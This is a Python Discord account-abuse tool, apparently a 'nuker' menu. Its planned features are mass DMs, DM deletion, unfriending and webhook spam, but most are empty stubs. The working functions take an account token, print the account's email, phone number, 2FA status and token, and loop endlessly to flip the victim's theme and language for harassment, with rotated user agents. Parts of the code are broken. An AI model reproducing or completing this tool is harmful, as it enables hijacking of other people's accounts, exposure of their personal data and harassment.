import requests
import os
import time
import sys 
import random
from datetime import datetime
from time import sleep
# ===========================================================================================
logo = """
                 ▄████████  ▄██████▄     ▄████████ ████████▄   ▄█     ▄████████ 
                ███    ███ ███    ███   ███    ███ ███   ▀███ ███    ███    ███ 
                ███    █▀  ███    ███   ███    ███ ███    ███ ███▌   ███    █▀  
                ███        ███    ███  ▄███▄▄▄▄██▀ ███    ███ ███▌   ███        
                ███        ███    ███ ▀▀███▀▀▀▀▀   ███    ███ ███▌ ▀███████████ 
                ███    █▄  ███    ███ ▀███████████ ███    ███ ███           ███ 
                ███    ███ ███    ███   ███    ███ ███   ▄███ ███     ▄█    ███ 
                ████████▀   ▀██████▀    ███    ███ ████████▀  █▀    ▄████████▀  
                                        ███    ███                              
                                    Made by OnajLikezz

"""
mainDisplay = """
        [1] All In One!         [2] MassDM      [3] DeleteDMs       [4] Give All Account info
        [5] Seizure Account     [6] Unfriender  [7] Login           [8] Webhook Spammer     
"""
# ===========================================================================================
heads = [
    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0",
    },
    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    },
    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    },
    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0",
    },
    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0",
    },
    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
    },
]
# ===========================================================================================
def cls():
    os.system('cls' if os.name == 'nt' else 'clear')

def get(url, **kwargs):
    return requests.get(url, **kwargs)

def getheaders(token=None):
    headers = random.choice(heads)
    if token:
        headers.update({"Authorization": token})
    return headers

def TokenCheck():
    cls()
    print(logo)
    token = input("Token: ")
    response = get('https://discord.com/api/v6/users/@me', headers={"Authorization": token})
    if response.status_code == 200:
        return token
    elif response.status_code == 401:
        cls()
        print(logo)
        print("Invalid Token!")
        time.sleep(2)
        TokenCheck()
    else:
        cls()
        print(logo)
        print("Error:", response.status_code)
        time.sleep(2)
        TokenCheck()
    cls()
# ===========================================================================================
def StartSeizure():
    current_setting = {'theme': None, 'locale': None}

    while True:
        setting = {'theme': random.choice(['dark', 'light']), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
        
        try:
            response = requests.patch("https://discord.com/api/v7/users/@me/settings", headers=getheaders(token), json=setting)
            response.raise_for_status()  # Raise exception if response status code is not in the 200 range
        except requests.exceptions.RequestException as e:
            print("Error occurred:", e)
        else:
            if current_setting != setting:
                print("Settings updated:", setting)
                current_setting = setting

        time.sleep(3)  # Adjust the interval as needed
# ===========================================================================================
def Info():
    token = TokenCheck()
    try:
        r = requests.get('https://discord.com/api/v6/users/@me', headers={'Authorization': f'Bearer {token}'})
        if r.status_code == 200:
            data = r.json()
            userName = data['username'] + '#' + data['discriminator']
            userID = data['id']
            creation_date = datetime.utcfromtimestamp(((int(userID) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
            language = data['locale']
            badges = "None"
            if 'flags' in data:
                flags = data['flags']
                if flags & 1:
                    badges += ", Staff"
                if flags & 2:
                    badges += ", Partner"
                # Add more badge checks here based on flag values

            phone = data.get('phone', "")
            email = data.get('email', "")
            mfa = data.get('mfa_enabled', False)
            avatar_url = f'https://cdn.discordapp.com/avatars/{userID}/{data["avatar"]}.webp' if data['avatar'] else ""
            has_nitro = False
            billing_info = []
            # Retrieve nitro data and billing info
            print(f'''
User Info:
Username: {userName}
User ID: {userID}
Created at: {creation_date}
Language: {language}
Badges: {badges}
Avatar URL: {avatar_url}
Token: {token}

Security Info:
2 Factor: {mfa}
Email: {email}
Phone number: {phone}

Nitro Info:
Nitro Status: {has_nitro}
            ''')

            input("Press Enter to continue...")
        else:
            print("Invalid Token.")
            sleep(1)
    except Exception as e:
        print(f"An error occurred: {e}")
        sleep(5)
# ===========================================================================================
def AllinOne():
    cls()
# ===========================================================================================
def main():
    cls()
    print(logo)
    print(mainDisplay)
    choice = input(": ")
    if choice == '1':
        cls()
        AllinOne()
    elif choice == '2':
        cls()
        print(logo)
    elif choice == '3':
        cls()
        print(logo)
    elif choice == '4':
        cls()
        print(logo)
        Info()
    elif choice == '5':
        cls()
        print(logo)
        StartSeizure()
    else:
        main()
# ===========================================================================================
if __name__ == '__main__':
    token = TokenCheck()
    main()